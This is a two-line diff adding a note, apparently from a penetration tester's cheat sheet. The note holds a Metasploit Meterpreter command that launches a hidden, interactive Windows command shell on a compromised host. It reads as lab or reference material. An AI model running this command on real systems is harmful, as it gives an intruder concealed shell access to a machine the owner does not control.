@@ -1,0 +1,2 @@
+#Open cmd through meterpreter
+execute -f cmd.exe -i -H
